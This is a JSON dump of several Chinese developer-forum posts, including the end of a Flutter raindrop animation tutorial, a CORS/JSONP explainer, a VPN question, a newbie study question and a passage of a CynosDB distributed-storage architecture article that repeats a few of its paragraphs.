}\n}\n</code></pre><p>注释(1)处，上文提到的<code>CustomPainter</code>会把canvas传过来，在这里完成单个水纹的绘制工作。</p>\n<p>注释(2)处，每个水纹圈需要确定的是位置，只要位置就行了，大小是随着时间均匀扩大的，给默认起始值就行。</p>\n<p>注释(3)处，透明度是随着半径扩大而逐渐透明的，这里简单的做了线性的映射。</p>\n<p>注释(4)处，绘制水纹圈，然后让水纹半径自增，实现每次绘制扩大的效果。</p>\n<p>注释(5)处，给定失效的条件。超过一定半径这个水纹就消失了。</p>\n<h3>扩散动画</h3>\n<p>Flutter中提供了很多的动画实现，这里用到的是AnimationController。</p>\n<p>其实AnimationController在这里就是提供了一个回调，每次收到vsync信号时回调做一次更新。</p>\n<pre class=\"prettyprint language-js\"><code>    _animation = new AnimationController(\n      &#x2F;&#x2F; 因为是repeat的，这里的duration其实不care\n        duration: const Duration(milliseconds: 200),\n        vsync: this)\n      ..addListener(() {\n        if (_rainList.isEmpty) { &#x2F;&#x2F;(1)\n          _animation.stop();\n        }\n        setState(() {});\n      });\n</code></pre><p>这里的动画是通过repeat启动的，所以不用太关心duration，因为只要不手动关闭实际上是会一直回调的。</p>\n<p>vsync设置的是当前的widget，提供了一个ticker，会定时回调。然后在回调中<code>setState</code>让当前widget更新UI。</p>\n<p>注释(1)处是动画停止的条件判断，当每次点击往<code>_rainList</code>中加一个对象，每个对象绘制会判断大小是否有效，如果无效会被从列表中移出，当列表中没有元素时就停止动画。</p>\n<h3>手势识别</h3>\n<p>上述基本实现了多个雨滴的展示和动画，然后我们要来实现对用户点击的响应。</p>\n<p>Flutter提供了<code>GestureDetector</code>这个widget来做手势识别。所以我们只需要用这个widget wrap住我们的自定义view，然后实现对应的手势监听方法即可。</p>\n<pre class=\"prettyprint language-js\"><code>      GestureDetector(\n        onTapUp: (TapUpDetails tapUp) {\n          RenderBox getBox = context.findRenderObject();\n          var localOffset = getBox.globalToLocal(tapUp.globalPosition); &#x2F;&#x2F; (1)\n\n          var rainDrop = RainDropDrawer(localOffset.dx, localOffset.dy);\n          _rainList.add(rainDrop);\n          _animation.repeat(); &#x2F;&#x2F; (2)\n        },\n        child: CustomPaint(\n          painter: RainDrop(_rainList),\n        ),\n      ),\n</code></pre><p>这里我们关注用户轻点后抬起的手势，这个监听的方法会传入<code>TapUpDetails</code>参数，这个参数含有抬起的位置参数，但是需要注意的是，这个坐标是全屏幕的坐标，而绘制的坐标是widget内的坐标，所以我们需要将这个坐标转换为我们widget内的坐标系，Flutter提供了这样的一个工具方法，参考<code>注释(1)</code>处的实现即可。</p>\n<p>完成了坐标换算，就可以构建一个“雨点”对象，添加到List里面。然后在<code>注释(2)</code>处启动动画，就可以看到我们文章开头的动画效果啦~</p>\n<h2>总结</h2>\n<p>Flutter的动画实现起来真的很简单，提供一个差值回调，然后不停的更新即可。不过这里暂时没有考虑性能等问题，对<code>setState</code>这个方法感觉还是很黑盒，不太懂Flutter具体的UI刷新原理。</p>\n<p>后面会梳理一下这类原理知识，否则还是有点担忧复杂动画按这种写法是否会卡顿。</p>\n<p><strong>此文已由作者授权腾讯云+社区发布</strong></p>\n<hr>\n</div>","title":"如何实现一个简单的雨滴动画？手把手告诉你","last_reply_at":"2018-12-28T11:13:03.476Z","good":false,"top":false,"reply_count":2,"visit_count":792,"create_at":"2018-12-27T10:15:45.740Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5809667e487e1e4578afb6c6","author_id":"57fef4a9fdf3bd3d6511858f","tab":"ask","content":"<div class=\"markdown-text\"><p>看到有人发帖问vpn，我也帮出国的朋友问问。\n流量无所谓，就是打打游戏，所以要求速度和稳定，代理到国外的很多，代回来的有吗</p>\n</div>","title":"代理回国内的vpn有好用的吗","last_reply_at":"2018-12-28T10:34:05.681Z","good":false,"top":false,"reply_count":6,"visit_count":4556,"create_at":"2016-10-21T00:51:10.214Z","author":{"loginname":"IEfucker","avatar_url":"https://avatars0.githubusercontent.com/u/3446876?v=4&s=120"}},{"id":"5c25f20876c4964062a1ec8b","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<p>做过 web 开发的同学，应该都遇到过跨域的问题，当我们从一个域名向另一个域名发送 Ajax 请求的时候，打开浏览器控制台就会看到跨域错误，今天我们就来聊聊跨域的问题。</p>\n<h2>1. 浏览器的同源策略</h2>\n<p>同源的定义是：如果两个页面的***协议***，<strong>*端口</strong>*（如果有指定）和***域名<em><strong>都相同，则两个页面具有相同的</strong>源</em>*。同源策略限制了从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的重要安全机制。</p>\n<h2>2. 跨域错误信息产生的原因</h2>\n<p>为了说明问题，我们可以做如下实验，我们在本地搭建了开发环境， 由客户端 <a href=\"http://localhost:3001\">http://localhost:3001</a> 向服务器 <a href=\"http://localhost:3000\">http://localhost:3000</a> 发送两个请求，一个使用 javascript 异步请求数据，另一个使用 img 标签请求数据，服务器收到请求后，打印接收到请求的日志，如下图所示：</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1000004/ru4prtsghc.png?imageView2/2/w/1620\" alt=\"img\">客户端发送两个请求</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1000004/re56gr5ufu.png?imageView2/2/w/1620\" alt=\"img\">服务端打印日志并处理请求</p>\n<p>代开客户端浏览器的控制台，可以看到发出了两个请求，并且都收到了状态码为 200 的响应，同时控制台报了一个错误，即 xhr 请求报错。由此我们可以知道，之所以产生跨域错误信息，原因有以下三条：</p>\n<ul>\n<li>浏览器端的限制（服务端收到了请求并正确返回）</li>\n<li>发送的是 XMLHttpRequest 请求（使用 img 标签发送的请求为 json 类型，并不会报错）</li>\n<li>请求了不同域的资源</li>\n</ul>\n<p>只有同时满足了这三个条件，浏览器才会产生跨域错误。</p>\n<h2>3. 解决跨域的思路</h2>\n<p>既然我们知道了跨域错误产生的原因，那么解决思路就很直观了，针对出错的三个原因进行相应的处理即可，相应的解决思路也有三个方向：</p>\n<ul>\n<li>打破浏览器的限制</li>\n<li>不发送 XHR 请求</li>\n<li>解决跨域</li>\n</ul>\n<p>下文将分别进行阐述。</p>\n<h3>3.1 打破浏览器的限制</h3>\n<p>由上面分析结论可知，之所以出现跨域的错误，实际上是客户端浏览器所做的限制，服务器并未进行限制，因此我们可以通过设置浏览器，使其不进行跨域检查。实际上浏览器也提供了对应的设置选项。</p>\n<p>以 MacOS 下的 Chrome 浏览器为例，在终端中使用命令</p>\n<pre class=\"prettyprint language-js\"><code>open -n &#x2F;Applications&#x2F;Google\\ Chrome.app&#x2F; --args --disable-web-security  --user-data-dir=&#x2F;Users&#x2F;your-computer-account&#x2F;MyChromeDevUserData&#x2F;\n</code></pre><p>打开浏览器，即可禁用 Chrome 浏览器的安全检查功能，同时也会禁用跨域安全检查功能，这样再次拿前面的例子进行测试，发现此时不会报错，同时也可以正确拿到服务端返回的数据。</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1000004/newdkj5bru.png?imageView2/2/w/1620\" alt=\"img\">禁用浏览器安全检查功能</p>\n<p>这种方式虽然可以实现跨域，但是需要每个用户都对浏览器进行设置，同时可能导致潜在的安全隐患，正常情况下不实用。但这个例子充分说明了，跨域错误是前端浏览器所做的限制，与后台服务无关。</p>\n<h3>3.2 JSONP实现跨域</h3>\n<p>根据思路2，既然跨域问题产生的原因是因为客户端发送了 Ajax 请求，那么我们打破这个条件即可。具体实现方式就是使用 JSONP 来进行跨域请求。</p>\n<pre class=\"prettyprint language-js\"><code>JSONP，是 JSON with Padding 的简称，它是 json 的一种补充使用方式，利用 script 标签来解决跨域问题。JSONP 是非官方协议，他只是前后端一个约定，如果请求参数带有约定的参数，则后台返回 javascript 代码而非 json 数据，返回代码是函数调用形式，函数名即约定值，函数参数即要返回的数据。\n</code></pre><p>JSONP 的实现原理如下图所示：</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1000004/e034qkfepl.png?imageView2/2/w/1620\" alt=\"img\">JSONP实现原理</p>\n<p>首先在客户端 js 中定义一个函数（假设名为 handler），然后动态创建一个 script 标签插入页面中，script 标签的 src 属性即要调用的地址，同时，在调用的 url 中加入一个服务端约定的参数（假设名为 callback，参数值为已定义的函数名 handler），服务端收到请求，如果发现请求的 url 中带有约定的参数，那么就返回一段函数调用形式的 javascript 代码，该段代码的函数名即为 callback 参数的值 handler，函数的参数即为待返回的数据。这样，客户端拿到返回结果后就会执行 handler 函数，对返回的数据进行处理。</p>\n<p>我们使用 jquery 向服务端发送一个 JSONP 格式的请求，从浏览器控制台可以看到请求和对应的响应，如下图所示：</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1000004/xugodz7a7w.png?imageView2/2/w/1620\" alt=\"img\">JSONP请求</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1000004/w5ys5xv6a2.png?imageView2/2/w/1620\" alt=\"img\">JSONP请求的响应</p>\n<p>由上图可以看到，发送JSONP请求时，请求的 Type 为 script 类型而非 xhr 类型，这样就打破了跨域报错的三个必要条件，不会产生跨域错误，同时也验证了服务端返回的数据格式为 javascript 代码调用的形式，其中 Jquery331045** 这一长串函数名是 jquery 自动生成的。</p>\n<p>由于 JSONP 的原理是使用 script 标签来加载数据，所以它的兼容性很好，但是使用 JSONP 来解决跨域问题存在以下缺陷：</p>\n<ol>\n<li>只能发送 GET 请求</li>\n<li>发送的不是 XHR 请求，这样导致 XHR 请求中的很多事件都无法进行处理</li>\n<li>服务端需要改动</li>\n</ol>\n<h3>3.3 跨域资源共享CORS</h3>\n<p>CORS 是一个 W3C 标准，全称是&quot;跨域资源共享&quot;（Cross-origin resource sharing）。它允许浏览器向跨源服务器，发出 XMLHttpRequest 请求，从而克服了 AJAX 只能同源使用的限制。CORS 基于 http 协议关于跨域方面的规定，使用时，客户端浏览器直接异步请求被调用端服务端，在响应头增加响应的字段，告诉浏览器后台允许跨域。</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1000004/lif2u422jo.png?imageView2/2/w/1620\" alt=\"img\">跨域错误</p>\n<p>回到文章开始的这个跨域错误信息，可以看到错误的具体信息是：服务端没有设置Access-Control-Allow-Origin 这个响应头从而导致报错，通过设置 Access-Control-Allow-Origin: * 这个响应头，我们可以解决问题。但是，这种设置能满足所有情况吗？ 更进一步，使用 CORS 时浏览器如何检查跨域错误？ 前面我们有讲到，虽然浏览器报错，但是在这之前服务端已经接受了请求，那么，浏览器总是先发出请求后再进行判断吗？下面我们一一讨论。</p>\n<h4>3.3.1 浏览器如何检查跨域错误</h4>\n<p>浏览器检查跨域错误的基本原理是：</p>\n<pre class=\"prettyprint language-js\"><code>浏览器检测到 ajax 请求的域与当前域不一致，会在请求头中增加 Origin 字段，然后检查服务端响应头 Access-Control-Allow-Origin，如果不存在或不匹配，则报跨域错误。\n</code></pre><p><img src=\"https://ask.qcloudimg.com/draft/1000004/w7bz3195yf.png?imageView2/2/w/1620\" alt=\"img\">浏览器检查跨域错误原理</p>\n<h4>3.3.2 浏览器总是先发出请求，然后根据是否有 Access-Control-Allow-Origin 响应头来判断吗</h4>\n<p>答案是，对于简单请求，是；而对于非简单请求，不是。非简单请求的情况下，浏览器并不是直接请求所需资源，而是会先发出一个预检请求，预检请求通过后才会对所需资源进行请求。</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1000004/o23nc6yr9c.png?imageView2/2/w/1620\" alt=\"img\">非简单请求预检请求</p>\n<p>这里涉及到的简单请求和非简单请求的概念，那么简单请求和非简单请求有什么区别呢？MDN 对非简单请求进行了定义，满足下列条件之一，即为非简单请求：</p>\n<ol>\n<li>使用了下列 HTTP 方法：PUT、DELETE、CONNECT、OPTIONS、TRACE、PATCH</li>\n<li>使用了除以下首部之外的其他首部：Accept、Accept-Language、Content-Language、Content-Type</li>\n<li>Content-Type首部的值不属于下列其中一个： application/x-www-form-urlencoded、 multipart/form-data、 text/plain</li>\n<li>请求中的 XMLHttpRequestUpload 对象注册了任意多个事件监听器</li>\n<li>请求中使用了ReadableStream对象</li>\n</ol>\n<p>简单来说，除了我们平时使用最多的 GET 和 POST 方法，以及最常使用的 Accept、Accept-Language、Content-Language 和 类型为  application/x-www-form-urlencoded、 multipart/form-data、 text/plain 的 Content-Type 请求头，其他基本都是非简单请求。对于这些非简单请求，浏览器会发出两个请求，第一个为 OPTIONS 遇见请求，遇见请求的响应检查通过后才会发出对资源的请求。</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1000004/edejhh5ok2.png?imageView2/2/w/1620\" alt=\"img\">非简单请求过程</p>\n<p>生产环境下，如果需要发送非简单跨域请求，每次两个请求会增加响应时间，为此，W3C 标准中增加了另一个响应头 Access-Control-Max-Age 参数，该响应头表明了对于非简单请求的预检请求浏览器的缓存时间，在缓存有效期内，非简单请求可以不发送预检请求，另外，实际开发中，可以在服务端设置接收到的请求方法是 OPTIONS 时，直接返回 200，这样也能加快响应。</p>\n<h4>3.3.3 设置 Access-Control-Allow-Origin: * 就行吗</h4>\n<p><img src=\"https://ask.qcloudimg.com/draft/1000004/bn8b5elcx9.png?imageView2/2/w/1620\" alt=\"img\">带cookie的跨域</p>\n<p>当我们需要发送带 cookie 的请求时，Access-Control-Allow-Origin 直接设置为通配符 * 时是无法通过浏览器的检查的，此时该响应头的值必须与发出请求的域完全匹配才行，另外，还需要设置 Access-Control-Allow-Credentials 响应头的值为 true，表示支持带 cookie 的跨域请求。</p>\n<h4>3.3.4 CORS请求头和响应头总结</h4>\n<p>请求头：</p>\n<ul>\n<li>Origin： 浏览器发出 Ajax 跨域请求之前会添加此头部，值为发送请求的域</li>\n<li>Access-Control-Request-Method：使用了除 GET、POST 请求方法之外的方法，浏览器会添加此头部，值为当前请求方法</li>\n<li>Access-Control-Request-Headers：使用了自定义头部或除了Accept、Accept-Language、Content-Language、Content-Type 之外的头部，浏览器会添加此头部，值为当前的请求方法</li>\n</ul>\n<p>响应头：</p>\n<ul>\n<li>Access-Control-Allow-Origin： 表示服务端允许哪些域请求资源</li>\n<li>Access-Control-Allow-Methods： 当客户端包含 Access-Control-Request-Method 请求头时，服务端需要响应该头部，值通常由 Reauest 的 header 中 Access-Control-Request-Method 取得</li>\n<li>Access-Control-Allow-Headers： 当客户端包含 Access-Control-Request-Headers 请求头时，服务端需要响应该头部，值通常由 Reauest 的 header 中 Access-Control-Request-Headers 取得</li>\n<li>Access-Control-Expose-Headers： 指出客户端通过 XHR 对象的 getResponseHeaders 方法可以获取的响应头有哪些</li>\n<li>Access-Control-Allow-Credentials： 允许带 cookie 的跨域请求</li>\n<li>Access-Control-Max-Age： 预检请求的缓存时间</li>\n</ul>\n<h2>4. 总结</h2>\n<p>本文介绍了跨域的原因，重点介绍了使用 JSONP 和 CORS 解决跨域问题的方法。除此之外，实际开发中还其他各种解决跨域问题的思路，本质上，这些方法都是打破跨域错误的三个条件，大家可以自行查资料了解一下。</p>\n<p><strong>此文已由作者授权腾讯云+社区在各渠道发布</strong></p>\n<hr>\n</div>","title":"web开发的跨域问题详解","last_reply_at":"2018-12-28T09:51:04.685Z","good":false,"top":false,"reply_count":0,"visit_count":630,"create_at":"2018-12-28T09:51:04.685Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c1cf7893898674067a76fa5","author_id":"5c1cf6e23898674067a76f9c","tab":"ask","content":"<div class=\"markdown-text\"><p>看到狼叔推荐的新手看node.js实战，但是有一些看得我好晕，跟视频又觉得视频学的好拖沓，而且很多不说原理，我该怎么办，大神们有更好扫地书推荐吗，好迷茫，打算年后找工作的！望大神们指点一二，感激不尽！</p>\n</div>","title":"24K纯新手急求学习方法","last_reply_at":"2018-12-28T09:49:55.583Z","good":false,"top":false,"reply_count":7,"visit_count":799,"create_at":"2018-12-21T14:24:09.091Z","author":{"loginname":"DM35868","avatar_url":"https://avatars1.githubusercontent.com/u/45394047?v=4&s=120"}},{"id":"5c25933776c4964062a1e9ce","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<blockquote>\n<p>本文作者：许中清，腾讯云自研数据库CynosDB的分布式存储CynosStore负责人。从事数据库内核开发、数据库产品架构和规划。曾就职于华为，2015年加入腾讯，参与过TBase（PGXZ）、CynosDB等数据库产品研发。专注于关系数据库、数据库集群、新型数据库架构等领域。目前担任CynosDB的分布式存储CynosStore负责人。</p>\n</blockquote>\n<p>企业IT系统迁移到公有云上已然是正在发生的趋势。数据库服务，作为公有云上提供的关键组件，是企业客户是否愿意将自己运行多年的系统搬到云上的关键考量之一。另一方面，自从System R开始，关系数据库系统已经大约四十年的历史了。尤其是随着互联网的发展，业务对数据库实例的吞吐量要求越来越高。对于很多业务来说，单个物理机器所能提供的最大吞吐量已经不能满足业务的高速发展。因此，数据库集群是很多IT系统绕不过去的坎。</p>\n<p>CynosDB for PostgreSQL是腾讯云自研的一款云原生数据库，其主要核心思想来自于亚马逊的云数据库服务Aurora。这种核心思想就是“基于日志的存储”和“存储计算分离”。同时，CynosDB在架构和工程实现上确实有很多和Aurora不一样的地方。CynosDB相比传统的单机数据库，主要解决如下问题：</p>\n<p><strong>存算分离</strong></p>\n<p>存算分离是云数据库区别于传统数据库的主要特点之一，主要是为了1）提升资源利用效率，用户用多少资源就给多少资源；2）计算节点无状态更有利于数据库服务的高可用性和集群管理（故障恢复、实例迁移）的便利性。</p>\n<p><strong>存储自动扩缩容</strong></p>\n<p>传统关系型数据库会受到单个物理机器资源的限制，包括单机上存储空间的限制和计算能力的限制。CynosDB采用分布式存储来突破单机存储限制。另外，存储支持多副本，通过RAFT协议来保证多副本的一致性。</p>\n<p><strong>更高的网络利用率</strong></p>\n<p>通过基于日志的存储设计思路，大幅度降低数据库运行过程中的网络流量。</p>\n<p><strong>更高的吞吐量</strong></p>\n<p>传统的数据库集群，面临的一个关键问题是：分布式事务和集群吞吐量线性扩展的矛盾。也就是说，很多数据库集群，要么支持完整的ACID，要么追求极好的线性扩展性，大部分时候鱼和熊掌不可兼得。前者比如Oracle RAC，是目前市场上最成熟最完善的数据库集群，提供对业务完全透明的数据访问服务。但是Oracle RAC的线性扩展性却被市场证明还不够，因此，更多用户主要用RAC来构建高可用集群，而不是高扩展的集群。后者比如Proxy+开源DB的数据库集群方案，通常能提供很好的线性扩展性，但是因为不支持分布式事务，对数据库用户存在较大的限制。又或者可以支持分布式事务，但是当跨节点写入比例很大时，反过来降低了线性扩展能力。CynosDB通过采用一写多读的方式，利用只读节点的线性扩展来提升整个系统的最大吞吐量，对于绝大部份公有云用户来说，这就已经足够了。</p>\n<p><strong>存储自动扩缩容</strong></p>\n<p>传统关系型数据库会受到单个物理机器资源的限制，包括单机上存储空间的限制和计算能力的限制。CynosDB采用分布式存储来突破单机存储限制。另外，存储支持多副本，通过RAFT协议来保证多副本的一致性。</p>\n<p><strong>更高的网络利用率</strong></p>\n<p>通过基于日志的存储设计思路，大幅度降低数据库运行过程中的网络流量。</p>\n<p><strong>更高的吞吐量</strong></p>\n<p>传统的数据库集群，面临的一个关键问题是：分布式事务和集群吞吐量线性扩展的矛盾。也就是说，很多数据库集群，要么支持完整的ACID，要么追求极好的线性扩展性，大部分时候鱼和熊掌不可兼得。前者比如Oracle RAC，是目前市场上最成熟最完善的数据库集群，提供对业务完全透明的数据访问服务。但是Oracle RAC的线性扩展性却被市场证明还不够，因此，更多用户主要用RAC来构建高可用集群，而不是高扩展的集群。后者比如Proxy+开源DB的数据库集群方案，通常能提供很好的线性扩展性，但是因为不支持分布式事务，对数据库用户存在较大的限制。又或者可以支持分布式事务，但是当跨节点写入比例很大时，反过来降低了线性扩展能力。CynosDB通过采用一写多读的方式，利用只读节点的线性扩展来提升整个系统的最大吞吐量，对于绝大部份公有云用户来说，这就已经足够了。</p>\n<p>下图为CynosDB for PostgreSQL的产品架构图，CynosDB是一个基于共享存储、支持一写多读的数据库集群。</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1002332/39m17zqpj9.jpg?imageView2/2/w/1620\" alt=\"img\">CynosDB for PostgreSQL产品架构图</p>\n<p>图一CynosDB for PostgreSQL产品架构图</p>\n<p>CynosDB基于CynosStore之上，CynosStore是一个分布式存储，为CynosDB提供坚实的底座。CynosStore由多个Store Node和CynosStore Client组成。CynosStore Client以二进制包的形式与DB（PostgreSQL）一起编译，为DB提供访问接口，以及负责主从DB之间的日志流传输。除此之外，每个Store Node会自动将数据和日志持续地备份到腾讯云对象存储服务COS上，用来实现PITR（即时恢复）功能。</p>\n<h1><strong>一、CynosStore数据组织形式</strong></h1>\n<p>CynosStore会为每一个数据库分配一段存储空间，我们称之为Pool，一个数据库对应一个Pool。数据库存储空间的扩缩容是通过Pool的扩缩容来实现的。一个Pool会分成多个Segment Group（SG），每个SG固定大小为10G。我们也把每个SG叫做一个逻辑分片。一个Segment Group（SG）由多个物理的Segment组成，一个Segment对应一个物理副本，多个副本通过RAFT协议来实现一致性。Segment是CynosStore中最小的数据迁移和备份单位。每个SG保存属于它的数据以及对这部分数据最近一段时间的写日志。</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1002332/fvvvnhvsba.jpg?imageView2/2/w/1620\" alt=\"img\">CynosStore 数据组织形式</p>\n<p>图二 CynosStore 数据组织形式</p>\n<p>图二中CynosStore一共有3个Store Node，CynosStore中创建了一个Pool，这个Pool由3个SG组成，每个SG有3个副本。CynosStore还有空闲的副本，可以用来给当前Pool扩容，也可以创建另一个Pool，将这空闲的3个Segment组成一个SG并分配个这个新的Pool。</p>\n<h1><strong>二、基于日志异步写的分布式存储</strong></h1>\n<p>传统的数据通常采用WAL（日志先写）来实现事务和故障恢复。这样做最直观的好处是1）数据库down机后可以根据持久化的WAL来恢复数据页。2）先写日志，而不是直接写数据，可以在数据库写操作的关键路径上将随机IO（写数据页）变成顺序IO（写日志），便于提升数据库性能。</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1002332/kpqqcfeg7b.jpg?imageView2/2/w/1620\" alt=\"img\">基于日志的存储</p>\n<p>图三 基于日志的存储</p>\n<p>图三（左）极度抽象地描述了传统数据库写数据的过程：每次修改数据的时候，必须保证日志先持久化之后才可以对数据页进行持久化。触发日志持久化的时机通常有</p>\n<p>1）事务提交时，这个事务产生的最大日志点之前的所有日志必须持久化之后才能返回给客户端事务提交成功；</p>\n<p>2）当日志缓存空间不够用时，必须持久化之后才能释放日志缓存空间；</p>\n<p>3）当数据页缓存空间不够用时，必须淘汰部分数据页来释放缓存空间。比如根据淘汰算法必须要淘汰脏页A，那么最后修改A的日志点之前的所有日志必须先持久化，然后才可以持久化A到存储，最后才能真正从数据缓存空间中将A淘汰。</p>\n<p>从理论上来说，数据库只需要持久化日志就可以了。因为只要拥有从数据库初始化时刻到当前的所有日志，数据库就能恢复出当前任何一个数据页的内容。也就是说，数据库只需要写日志，而不需要写数据页，就能保证数据的完整性和正确性。但是，实际上数据库实现者不会这么做，因为1）从头到尾遍历日志恢复出每个数据页将是非常耗时的；2）全量日志比数据本身规模要大得多，需要更多的磁盘空间去存储。</p>\n<p>那么，如果持久化日志的存储设备不仅仅具有存储能力，还拥有计算能力，能够自行将日志重放到最新的页的话，将会怎么样？是的，如果这样的话，数据库引擎就没有必要将数据页传递给存储了，因为存储可以自行计算出新页并持久化。这就是CynosDB“采用基于日志的存储”的核心思想。图三（右）极度抽象地描述了这种思想。图中计算节点和存储节点置于不同的物理机，存储节点除了持久化日志以外，还具备通过apply日志生成最新数据页面的能力。如此一来，计算节点只需要写日志到存储节点即可，而不需要再将数据页传递给存储节点。</p>\n<p>下图描述了采用基于日志存储的CynosStore的结构。</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/1002332/mhsn4zo3mx.jpg?imageView2/2/w/1620\" alt=\"img\">基于日志的存储</p>\n<p>图四 CynosStore：基于日志的存储</p>\n<p>此图描述了数据库引擎如何访问CynosStore。数据库引擎通过CynosStore Client来访问CynosStore。最核心的两个操作包括1）写日志；2）读数据页。</p>\n<p>数据库引擎将数据库日志传递给CynosStore，CynosStore Client负责将数据库日志转换成CynosStore Journal，并且负责将这些并发写入的Journal进行序列化，最后根据Journal修改的数据页路由到不同的SG上去，并发送给SG所属Store Node。另外，CynosStore Client采用异步的方式监听各个Store Node的日志持久化确认消息，并将归并之后的最新的持久化日志点告诉数据库引擎。</p>\n<p>当数据库引擎访问的数据页在缓存中不命中时，需要向CynosStore读取需要的页（read block）。read block是同步操作。并且，CynosStore支持一定时间范围的多版本页读取。因为各个Store Node在重放日志时的步调不能完全做到一致，总会有先有后，因此需要读请求发起者提供一致性点来保证数据库引擎所要求的一致性，或者默认情况下由CynosStore用最新的一致性点（读点）去读数据页。另外，在一写多读的场景下，只读数据库实例也需要用到CynosStore提供的多版本特性。</p>\n<p>CynosStore提供两个层面的访问接口：一个是块设备层面的接口，另一个是基于块设备的文件系统层面的接口。分别叫做CynosBS和CynosFS，他们都采用这种异步写日志、同步读数据的接口形式。那么，CynosDB for PostgreSQL，采用基于日志的存储，相比一主多从PostgreSQL集群来说，到底能带来哪些好处？</p>\n<p>1）减少网络流量。首先，只要存算分离就避免不了计算节点向存储节点发送数据。如果我们还是使用传统数据库+网络硬盘的方式来做存算分离（计算和存储介质的分离），那么网络中除了需要传递日志以外，还需要传递数据，传递数据的大小由并发写入量、数据库缓存大小、以及checkpoint频率来决定。以CynosStore作为底座的CynosDB只需要将日志传递给CynosStore就可以了，降低网络流量。</p>\n<p>2）更加有利于基于共享存储的集群的实现：一个数据库的多个实例（一写多读）访问同一个Pool。基于日志写的CynosStore能够保证只要DB主节点（读写节点）写入日志到CynosStore，就能让从节点（只读节点）能够读到被这部分日志修改过的数据页最新版本，而不需要等待主节点通过checkpoint等操作将数据页持久化到存储才能让读节点见到最新数据页。这样能够大大降低主从数据库实例之间的延时。不然，从节点需要等待主节点将数据页持久化之后（checkpoint）才能推进读点。如果这样，对于主节点来说，checkpoint的间隔太久的话，就会导致主从延时加大，如果checkpoint间隔太小，又会导致主节点写数据的网络流量增大。</p>\n<p>当然，apply日志之后的新数据页的持久化，这部分工作总是要做的，不会凭空消失，只是从数据库引擎下移到了CynosStore。但是正如前文所述，除了降低不必要的网络流量以外，CynosStore的各个SG是并行来做redo和持久化的。并且一个Pool的SG数量可以按需扩展，SG的宿主Store Node可以动态调度，因此可以用非常灵活和高效的方式来完成这部分工作。</p>\n<h1><strong>三、CynosStore</strong> <strong>Journal（CSJ）</strong></h1>\n<p>CynosStore Journal（CSJ）完成类似数据库日志的功能，比如PostgreSQL的WAL。CSJ与PostgreSQL WAL不同的地方在于：CSJ拥有自己的日志格式，与数据库语义解耦合。PostgreSQL WAL只有PostgreSQL引擎可以生成和解析，也就是说，当其他存储引擎拿到PostgreSQL WAL片段和这部分片段所修改的基础页内容，也没有办法恢复出最新的页内容。CSJ致力于定义一种与各种存储引擎逻辑无关的日志格式，便于建立一个通用的基于日志的分布式存储系统。CSJ定了5种Journal类型：</p>\n<p>1.SetByte：用Journal中的内容覆盖指定数据页中、指定偏移位置、指定长度的连续存储空间。</p>\n<p>\\2. SetBit：与SetByte类似，不同的是SetBit的最小粒度是Bit，例如PostgreSQL中hitbit信息，可以转换成SetBit日志。</p>\n<p>\\3. ClearPage：当新分配Page时，需要将其初始化，此时新分配页的原始内容并不重要，因此不需要将其从物理设备中读出来，而仅仅需要用一个全零页写入即可，ClearPage就是描述这种修改的日志类型。</p>\n<p>\\4. DataMove：有一些写入操作将页面中一部分的内容移动到另一个地方，DataMove类型的日志用来描述这种操作。比如PostgreSQL在Vacuum过程中对Page进行compact操作，此时用DataMove比用SetByte日志量更小。</p>\n<p>\\5. UserDefined：数据库引擎总会有一些操作并不会修改某个具体的页面内容，但是需要存放在日志中。比如PostgreSQL的最新的事务id（xid）就是存储在WAL中，便于数据库故障恢复时知道从那个xid开始分配。这种类型日志跟数据库引擎语义相关，不需要CynosStore去理解，但是又需要日志将其持久化。UserDefined就是来描述这种日志的。CynosStore针对这种日志只负责持久化和提供查询接口，apply CSJ时会忽略它。</p>\n<p>以上5种类型的Journal是存储最底层的日志，只要对数据的写是基于块/页的，都可以转换成这5种日志来描述。当然，也有一些引擎不太适合转换成这种最底层的日志格式，比如基于LSM的存储引擎。</p>\n<p>CSJ的另一个特点是乱序持久化，因为一个Pool的CSJ会路由到多个SG上，并且采用异步写入的方式。而每个SG返回的journal ack并不同步，并且相互穿插，因此CynosStore Client还需要将这些ack进行归并并推进连续CSJ点（VDL）。</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1002332/3ltbcisx64.png?imageView2/2/w/1620\" alt=\"img\"> CynosStore日志路由和乱序ACK</p>\n<p>图五 